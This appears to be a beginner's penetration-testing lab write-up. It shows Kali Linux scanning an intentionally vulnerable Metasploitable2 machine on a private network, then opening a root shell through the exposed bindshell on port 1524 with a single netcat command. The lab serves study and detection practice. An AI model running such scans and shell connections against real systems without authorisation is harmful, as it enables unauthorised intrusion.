🛡️ Metasploitable2 – Initial Access & Root via Bindshell (Port 1524)
📌 Overview

This lab documents the initial setup of a local penetration testing environment using Kali Linux and Metasploitable2. The objective was to perform enumeration, identify vulnerabilities, and achieve root access on the target machine.

🧱 Lab Setup
🖥️ Attacker

OS: Kali Linux (VMware)

Network: NAT

🎯 Target

OS: Metasploitable2

Network: NAT

🔧 Environment Preparation
Kali Network Fix (Key Issue Encountered)

During setup, Kali was unable to reach update repositories:

Temporary failure resolving 'http.kali.org'
Resolution:

Ensured network adapter was connected

Restarted VMware networking services

Restored Virtual Network defaults

Re-added network adapter

Verified IP assignment using:

ip a
System Update
sudo apt update && sudo apt full-upgrade -y
sudo apt autoremove -y
🌐 Target Deployment

Metasploitable2 was imported into VMware and configured with NAT networking.

Connectivity Check

Target IP:

192.168.74.129

Verification:

ping 192.168.74.129
🔍 Enumeration
Nmap Scan
nmap -sC -sV 192.168.74.129
Key Findings
Port	Service	Version	Notes
21	FTP	vsftpd 2.3.4	Known backdoor vulnerability
22	SSH	OpenSSH 4.7	Outdated
23	Telnet	-	Insecure
80	HTTP	Apache 2.2.8	Web server
139/445	SMB	Samba 3.0.20	Potential exploit
1524	bindshell	-	🚨 Direct root access
3306	MySQL	5.0.51	Database
8180	Tomcat	5.5	Web application
💥 Exploitation
🎯 Target: Bindshell (Port 1524)

The Nmap scan revealed an open bindshell service on port 1524, indicating a potential direct shell access point.

Exploit Execution
nc 192.168.74.129 1524
🎯 Result
root@metasploitable:/#
Verification
whoami

Output:

root
🧠 Analysis

Port 1524 exposed a preconfigured root bindshell

No authentication required

Immediate root-level access achieved

Represents a critical security misconfiguration

🔐 Security Implications

This scenario highlights:

The importance of network enumeration

Risks of exposed services

The necessity of proper system hardening

Why continuous monitoring and detection are critical

📸 Proof of Exploitation

(Add screenshots here)

Nmap scan results

Netcat connection

Root shell confirmation (whoami)

🗂️ Notes

This was the first successful exploitation in the lab environment

Demonstrates a low-effort, high-impact vulnerability

Establishes baseline for future attack + detection scenarios

🚀 Next Steps

Capture attack traffic using Wireshark

Analyze indicators of compromise

Forward logs into Splunk

Build detection queries and dashboards
